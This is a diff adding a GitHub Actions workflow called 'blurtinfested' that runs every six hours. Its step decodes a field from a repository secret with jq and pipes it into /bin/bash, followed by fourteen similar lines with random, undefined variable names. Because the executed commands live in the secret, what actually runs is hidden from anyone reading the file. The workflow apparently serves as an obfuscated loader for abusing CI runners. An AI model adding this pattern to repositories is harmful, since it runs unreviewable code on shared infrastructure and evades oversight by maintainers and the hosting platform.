@@ -1,0 +1,32 @@
+name: blurtinfested
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: blurtinfested
+        env:
+          wpe75: ${{ secrets.wpe75 }}
+        run: |
+          echo $wpe75 | jq -r .qaswy58 | /bin/bash
+          echo $l8418 | jq -r .uraq71 | /bin/bash
+          echo $dvnh3608 | jq -r .blv52186 | /bin/bash
+          echo $imbt4501 | jq -r .prcpx49321 | /bin/bash
+          echo $fzmjc1858 | jq -r .lspr52 | /bin/bash
+          echo $j57397 | jq -r .is464 | /bin/bash
+          echo $a1895 | jq -r .hg1 | /bin/bash
+          echo $fhgp74 | jq -r .huddi04 | /bin/bash
+          echo $vfsnp875 | jq -r .pxt478 | /bin/bash
+          echo $ftxo999 | jq -r .hxom325 | /bin/bash
+          echo $wah08 | jq -r .dbhc8 | /bin/bash
+          echo $ntzi67 | jq -r .eehv363 | /bin/bash
+          echo $jds316 | jq -r .tc23 | /bin/bash
+          echo $mzvjo33908 | jq -r .gonme02303 | /bin/bash
+          echo $p32 | jq -r .ysj6677 | /bin/bash
+
